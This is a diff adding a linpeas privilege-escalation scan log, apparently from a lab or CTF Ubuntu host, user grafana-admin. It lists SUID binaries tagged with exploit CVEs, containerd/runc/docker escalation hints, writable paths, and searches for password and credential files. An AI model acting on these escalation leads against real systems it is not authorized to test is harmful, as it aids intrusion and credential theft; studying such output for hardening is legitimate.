@@ -4007,3 +4007,1340 @@ PasswordAuthentication yes
 /snap/core20/1328/etc/ssl/certs/ca-certificates.crt
 19623PSTORAGE_CERTSBIN
 
+══╣ Writable ssh and gpg agents
+/etc/systemd/user/sockets.target.wants/gpg-agent.socket
+/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
+/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
+/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
+══╣ Some home ssh config file was found
+/usr/share/openssh/sshd_config
+Include /etc/ssh/sshd_config.d/*.conf
+ChallengeResponseAuthentication no
+UsePAM yes
+X11Forwarding yes
+PrintMotd no
+AcceptEnv LANG LC_*
+Subsystem	sftp	/usr/lib/openssh/sftp-server
+
+══╣ /etc/hosts.allow file found, trying to read the rules:
+/etc/hosts.allow
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Include /etc/ssh/ssh_config.d/*.conf
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
+╔══════════╣ Analyzing PAM Auth Files (limit 70)
+drwxr-xr-x 2 root root 4096 Apr  6  2022 /etc/pam.d
+-rw-r--r-- 1 root root 2133 Dec  2  2021 /etc/pam.d/sshd
+
+╔══════════╣ Searching tmux sessions
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
+tmux 3.0a
+
+/tmp/tmux-1001
+╔══════════╣ Analyzing Cloud Init Files (limit 70)
+-rw-r--r-- 1 root root 3807 Nov  3  2021 /etc/cloud/cloud.cfg
+     lock_passwd: True
+-rw-r--r-- 1 root root 3807 Nov  3  2021 /snap/core20/1328/etc/cloud/cloud.cfg
+     lock_passwd: True
+-rw-r--r-- 1 root root 3807 Nov  3  2021 /snap/core20/1405/etc/cloud/cloud.cfg
+     lock_passwd: True
+
+╔══════════╣ Analyzing Keyring Files (limit 70)
+drwxr-xr-x 2 root root 200 Jan 14  2022 /snap/core20/1328/usr/share/keyrings
+drwxr-xr-x 2 root root 200 Mar 18  2022 /snap/core20/1405/usr/share/keyrings
+drwxr-xr-x 2 root root 4096 Apr  6  2022 /usr/share/keyrings
+
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/pam.d/passwd
+passwd file: /etc/passwd
+passwd file: /snap/core20/1328/etc/pam.d/passwd
+passwd file: /snap/core20/1328/etc/passwd
+passwd file: /snap/core20/1328/usr/share/bash-completion/completions/passwd
+passwd file: /snap/core20/1328/usr/share/lintian/overrides/passwd
+passwd file: /snap/core20/1328/var/lib/extrausers/passwd
+passwd file: /snap/core20/1405/etc/pam.d/passwd
+passwd file: /snap/core20/1405/etc/passwd
+passwd file: /snap/core20/1405/usr/share/bash-completion/completions/passwd
+passwd file: /snap/core20/1405/usr/share/lintian/overrides/passwd
+passwd file: /snap/core20/1405/var/lib/extrausers/passwd
+passwd file: /usr/share/bash-completion/completions/passwd
+passwd file: /usr/share/lintian/overrides/passwd
+
+╔══════════╣ Analyzing PGP-GPG Files (limit 70)
+/usr/bin/gpg
+netpgpkeys Not Found
+netpgp Not Found
+
+-rw-r--r-- 1 root root 2235 Apr  6  2022 /etc/apt/trusted.gpg
+-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
+-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
+-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
+-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1328/usr/share/keyrings/ubuntu-archive-keyring.gpg
+-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1328/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
+-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1328/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
+-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1328/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
+-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1328/usr/share/keyrings/ubuntu-master-keyring.gpg
+-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1405/usr/share/keyrings/ubuntu-archive-keyring.gpg
+-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1405/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
+-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1405/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
+-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1405/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
+-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1405/usr/share/keyrings/ubuntu-master-keyring.gpg
+-rw-r--r-- 1 root root 3267 Jan  6  2021 /usr/share/gnupg/distsigkey.gpg
+-rw-r--r-- 1 root root 2760 Apr  6  2022 /usr/share/keyrings/docker-archive-keyring.gpg
+-rw-r--r-- 1 root root 2247 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-cc-eal.gpg
+-rw-r--r-- 1 root root 2274 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-cis.gpg
+-rw-r--r-- 1 root root 2236 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
+-rw-r--r-- 1 root root 2264 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
+-rw-r--r-- 1 root root 2275 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-fips.gpg
+-rw-r--r-- 1 root root 2235 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-ros.gpg
+-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
+-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
+-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
+-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
+-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
+-rw-r--r-- 1 root root 2867 Feb 13  2020 /usr/share/popularity-contest/debian-popcon.gpg
+
+╔══════════╣ Analyzing Cache Vi Files (limit 70)
+
+╔══════════╣ Checking if containerd(ctr) is available
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation
+ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
+ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"
+
+╔══════════╣ Checking if runc is available
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation
+runc was found in /usr/bin/runc, you may be able to escalate privileges with it
+
+╔══════════╣ Searching docker files (limit 70)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
+lrwxrwxrwx 1 root root 33 Apr  6  2022 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
+-rw-r--r-- 1 root root 175 Mar 24  2022 /usr/lib/systemd/system/docker.socket
+-rw-r--r-- 1 root root 0 Apr  6  2022 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket
+
+╔══════════╣ Analyzing Postfix Files (limit 70)
+-rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1328/usr/share/bash-completion/completions/postfix
+
+-rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1405/usr/share/bash-completion/completions/postfix
+
+-rw-r--r-- 1 root root 813 Feb  2  2020 /usr/share/bash-completion/completions/postfix
+
+╔══════════╣ Analyzing Bind Files (limit 70)
+-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind
+-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind
+
+╔══════════╣ Analyzing Other Interesting Files (limit 70)
+-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
+-rw-r--r-- 1 fred fred 3771 Feb 25  2020 /home/fred/.bashrc
+-rw-r--r-- 1 grafana-admin grafana-admin 3771 Feb 25  2020 /home/grafana-admin/.bashrc
+-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1328/etc/skel/.bashrc
+-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1405/etc/skel/.bashrc
+
+-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
+-rw-r--r-- 1 fred fred 807 Feb 25  2020 /home/fred/.profile
+-rw-r--r-- 1 grafana-admin grafana-admin 807 Feb 25  2020 /home/grafana-admin/.profile
+-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1328/etc/skel/.profile
+-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1405/etc/skel/.profile
+
+-rw-r--r-- 1 fred fred 0 Apr  6  2022 /home/fred/.sudo_as_admin_successful
+
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
+                               ╚═══════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+strings Not Found
+-rwsr-xr-x 1 root root 121K Mar 22  2022 /snap/snapd/15314/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-x 1 root root 121K Feb 15  2022 /snap/snapd/14978/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-x 1 root root 84K Jul 14  2021 /snap/core20/1405/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 52K Jul 14  2021 /snap/core20/1405/usr/bin/chsh
+-rwsr-xr-x 1 root root 87K Jul 14  2021 /snap/core20/1405/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1405/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 44K Jul 14  2021 /snap/core20/1405/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 67K Jul 14  2021 /snap/core20/1405/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1405/usr/bin/su
+-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1405/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1405/usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-- 1 root systemd-resolve 51K Jun 11  2020 /snap/core20/1405/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 463K Dec  2  2021 /snap/core20/1405/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 84K Jul 14  2021 /snap/core20/1328/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 52K Jul 14  2021 /snap/core20/1328/usr/bin/chsh
+-rwsr-xr-x 1 root root 87K Jul 14  2021 /snap/core20/1328/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 55K Jul 21  2020 /snap/core20/1328/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 44K Jul 14  2021 /snap/core20/1328/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 67K Jul 14  2021 /snap/core20/1328/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 67K Jul 21  2020 /snap/core20/1328/usr/bin/su
+-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1328/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 39K Jul 21  2020 /snap/core20/1328/usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-- 1 root systemd-resolve 51K Jun 11  2020 /snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 463K Dec  2  2021 /snap/core20/1328/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 463K Dec  2  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 140K Feb 23  2022 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-- 1 root messagebus 51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su
+-rwsr-xr-x 1 root root 87K Jul 14  2021 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 84K Jul 14  2021 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 52K Jul 14  2021 /usr/bin/chsh
+-rwsr-xr-x 1 root root 44K Jul 14  2021 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 67K Jul 14  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
+-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x 1 root root 31K Feb 21  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwxr-sr-x 1 root shadow 83K Jul 14  2021 /snap/core20/1405/usr/bin/chage
+-rwxr-sr-x 1 root shadow 31K Jul 14  2021 /snap/core20/1405/usr/bin/expiry
+-rwxr-sr-x 1 root crontab 343K Dec  2  2021 /snap/core20/1405/usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1405/usr/bin/wall
+-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1405/usr/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1405/usr/sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 83K Jul 14  2021 /snap/core20/1328/usr/bin/chage
+-rwxr-sr-x 1 root shadow 31K Jul 14  2021 /snap/core20/1328/usr/bin/expiry
+-rwxr-sr-x 1 root crontab 343K Dec  2  2021 /snap/core20/1328/usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 35K Jul 21  2020 /snap/core20/1328/usr/bin/wall
+-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1328/usr/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1328/usr/sbin/unix_chkpwd
+-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /usr/sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /usr/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
+-rwxr-sr-x 1 root shadow 83K Jul 14  2021 /usr/bin/chage
+-rwxr-sr-x 1 root ssh 343K Dec  2  2021 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root shadow 31K Jul 14  2021 /usr/bin/expiry
+-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
+-rwxr-sr-x 1 root tty 35K Feb  7  2022 /usr/bin/wall
+-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+
+╔══════════╣ Checking misconfigurations of ld.so
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/usr/local/lib/x86_64-linux-gnu
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+Current env capabilities:
+Current: =
+Current proc capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Parent Shell capabilities:
+0x0000000000000000=
+
+Files with capabilities (limited to 50):
+/snap/core20/1405/usr/bin/ping = cap_net_raw+ep
+/snap/core20/1328/usr/bin/ping = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+
+╔══════════╣ Users with capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+
+╔══════════╣ AppArmor binary profiles
+-rw-r--r-- 1 root root  3222 Mar 11  2020 sbin.dhclient
+-rw-r--r-- 1 root root  3202 Feb 25  2020 usr.bin.man
+-rw-r--r-- 1 root root 28249 Feb 18  2022 usr.lib.snapd.snap-confine.real
+-rw-r--r-- 1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
+-rw-r--r-- 1 root root  1385 Dec  7  2019 usr.sbin.tcpdump
+
+╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
+/usr/bin/rescan-scsi-bus.sh
+/usr/bin/gettext.sh
+/usr/bin/dockerd-rootless-setuptool.sh
+/usr/bin/dockerd-rootless.sh
+
+╔══════════╣ Executable files potentially added by user (limit 70)
++08:24:18.9353574940 /usr/local/bin/docker-compose
+2022-04-06+08:14:30.1599999750 /etc/console-setup/cached_setup_terminal.sh
+2022-04-06+08:14:30.1599999750 /etc/console-setup/cached_setup_keyboard.sh
+2022-04-06+08:14:30.1599999750 /etc/console-setup/cached_setup_font.sh
+
+╔══════════╣ Unexpected in /opt (usually empty)
+total 12
+drwxr-xr-x  3 root root 4096 Apr  6  2022 .
+drwxr-xr-x 19 root root 4096 Apr  6  2022 ..
+drwx--x--x  4 root root 4096 Apr  6  2022 containerd
+
+╔══════════╣ Unexpected in root
+/swap.img
+
+╔══════════╣ Files (scripts) in /etc/profile.d/
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
+total 44
+drwxr-xr-x   2 root root 4096 Apr  6  2022 .
+drwxr-xr-x 101 root root 4096 Apr  6  2022 ..
+-rw-r--r--   1 root root   96 Dec  5  2019 01-locale-fix.sh
+-rw-r--r--   1 root root  835 Feb 18  2022 apps-bin-path.sh
+-rw-r--r--   1 root root  729 Feb  2  2020 bash_completion.sh
+-rw-r--r--   1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
+-rw-r--r--   1 root root 1107 Nov  3  2019 gawk.csh
+-rw-r--r--   1 root root  757 Nov  3  2019 gawk.sh
+-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh
+-rwxr-xr-x   1 root root  873 Nov  3  2021 Z99-cloudinit-warnings.sh
+-rwxr-xr-x   1 root root 3417 Nov  3  2021 Z99-cloud-locale-test.sh
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No
+═╣ Credentials in fstab/mtab? ........... No
+═╣ Can I read shadow files? ............. No
+═╣ Can I read shadow plists? ............ No
+═╣ Can I write shadow plists? ........... No
+═╣ Can I read opasswd file? ............. No
+═╣ Can I write in network-scripts? ...... No
+═╣ Can I read root folder? .............. No
+
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/
+/root/
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service
+/sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service
+
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/home/grafana-admin/.gnupg/pubring.kbx
+/home/grafana-admin/.gnupg/trustdb.gpg
+/home/grafana-admin/snap/lxd/common/config/config.yml
+/var/log/journal/57cbfb2b1cf2404f9c0a757dbb01eaa1/system.journal
+/var/log/journal/57cbfb2b1cf2404f9c0a757dbb01eaa1/user-1001.journal
+/var/log/auth.log
+/var/log/kern.log
+/var/log/syslog
+
+╔══════════╣ Writable log files (logrotten) (limit 50)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation
+logrotate 3.14.0
+
+    Default mail command:       /usr/bin/mail
+    Default compress command:   /bin/gzip
+    Default uncompress command: /bin/gunzip
+    Default compress extension: .gz
+    Default state file path:    /var/lib/logrotate/status
+    ACL support:                yes
+    SELinux support:            yes
+
+╔══════════╣ Files inside /home/grafana-admin (limit 20)
+total 32
+drwxr-xr-x 5 grafana-admin grafana-admin 4096 Feb 16 00:29 .
+drwxr-xr-x 4 root          root          4096 Apr  6  2022 ..
+-rw-r--r-- 1 grafana-admin grafana-admin  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 grafana-admin grafana-admin 3771 Feb 25  2020 .bashrc
+drwx------ 2 grafana-admin grafana-admin 4096 Apr  6  2022 .cache
+drwx------ 3 grafana-admin grafana-admin 4096 Feb 16 00:29 .gnupg
+-rw-r--r-- 1 grafana-admin grafana-admin  807 Feb 25  2020 .profile
+drwx------ 3 grafana-admin grafana-admin 4096 Feb 16 00:29 snap
+
+╔══════════╣ Files inside others home (limit 20)
+/home/fred/.bash_logout
+/home/fred/.bashrc
+/home/fred/.bash_history
+/home/fred/.profile
+/home/fred/.sudo_as_admin_successful
+
+╔══════════╣ Searching installed mail applications
+
+╔══════════╣ Mails (limit 50)
+
+╔══════════╣ Backup files (limited 100)
+-rw-r--r-- 1 root root 2743 Feb 23  2022 /etc/apt/sources.list.curtin.old
+-rw-r--r-- 1 root root 43888 Mar  9  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 9073 Mar 24  2022 /usr/lib/modules/5.4.0-107-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 9833 Mar 24  2022 /usr/lib/modules/5.4.0-107-generic/kernel/drivers/power/supply/wm831x_backup.ko
+-rw-r--r-- 1 root root 1775 Aug 16  2021 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
+-rw-r--r-- 1 root root 1403 Feb 23  2022 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-38.pyc
+-rw-r--r-- 1 root root 0 Mar 24  2022 /usr/src/linux-headers-5.4.0-107-generic/include/config/net/team/mode/activebackup.h
+-rw-r--r-- 1 root root 0 Mar 24  2022 /usr/src/linux-headers-5.4.0-107-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 237986 Mar 24  2022 /usr/src/linux-headers-5.4.0-107-generic/.config.old
+-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-107/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
+-rw-r--r-- 1 root root 392817 Feb  9  2020 /usr/share/doc/manpages/Changes.old.gz
+-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
+-rw-r--r-- 1 root root 11070 Apr  6  2022 /usr/share/info/dir.old
+-rw-r--r-- 1 root root 2756 Feb 13  2020 /usr/share/man/man8/vgcfgbackup.8.gz
+-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
+-rw-r--r-- 1 root root 4096 Feb 16 00:30 /sys/devices/virtual/net/vethb04dc13/brport/backup_port
+-rw-r--r-- 1 root root 4096 Feb 16 00:30 /sys/devices/virtual/net/vethef03e0f/brport/backup_port
+-rw-r--r-- 1 root root 4096 Feb 16 00:30 /sys/devices/virtual/net/veth0bb1f03/brport/backup_port
+-rw-r--r-- 1 root root 4096 Feb 16 00:30 /sys/devices/virtual/net/vethdcbd088/brport/backup_port
+-rw-r--r-- 1 root root 4096 Feb 16 00:30 /sys/devices/virtual/net/veth4304f9e/brport/backup_port
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3031001
+Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3031001
+
+ -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
+ -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
+
+╔══════════╣ Web files?(output limit)
+
+╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw------- 1 root root 0 Feb 23  2022 /etc/.pwd.lock
+-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
+-rw-r--r-- 1 grafana-admin grafana-admin 220 Feb 25  2020 /home/grafana-admin/.bash_logout
+-rw-r--r-- 1 fred fred 220 Feb 25  2020 /home/fred/.bash_logout
+-rw-r--r-- 1 landscape landscape 0 Feb 23  2022 /var/lib/landscape/.cleanup.user
+-rw------- 1 root root 0 Feb 15 22:35 /run/snapd/lock/.lock
+-rw-r--r-- 1 root root 20 Feb 15 22:35 /run/cloud-init/.instance-id
+-rw-r--r-- 1 root root 2 Feb 15 22:35 /run/cloud-init/.ds-identify.result
+-rw------- 1 root root 0 Mar 18  2022 /snap/core20/1405/etc/.pwd.lock
+-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1405/etc/skel/.bash_logout
+-rw------- 1 root root 0 Jan 14  2022 /snap/core20/1328/etc/.pwd.lock
+-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1328/etc/skel/.bash_logout
+
+╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rwxrwxr-x 1 grafana-admin grafana-admin 828098 Feb 10 20:38 /tmp/linpeas.sh
+-rw-r--r-- 1 root root 35017 Apr  6  2022 /var/backups/apt.extended_states.0
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/home/grafana-admin
+/run/lock
+/run/screen
+/run/user/1001
+/run/user/1001/dbus-1
+/run/user/1001/dbus-1/services
+/run/user/1001/gnupg
+/run/user/1001/inaccessible
+/run/user/1001/systemd
+/run/user/1001/systemd/transient
+/run/user/1001/systemd/units
+/snap/core20/1328/run/lock
+/snap/core20/1328/tmp
+/snap/core20/1328/var/tmp
+/snap/core20/1405/run/lock
+/snap/core20/1405/tmp
+/snap/core20/1405/var/tmp
+/tmp
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/linpeas.sh
+/tmp/.Test-unix
+/tmp/tmux-1001
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/crash
+/var/tmp
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+  Group grafana-admin:
+/tmp/linpeas.sh
+
+╔══════════╣ Searching passwords in history files
+
+╔══════════╣ Searching *password* or *credential* files in home (limit 70)
+/etc/pam.d/common-password
+/usr/bin/systemd-ask-password
+/usr/bin/systemd-tty-ask-password-agent
+/usr/lib/git-core/git-credential
+/usr/lib/git-core/git-credential-cache
+/usr/lib/git-core/git-credential-cache--daemon
+/usr/lib/git-core/git-credential-store
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/grub/i386-pc/password.mod
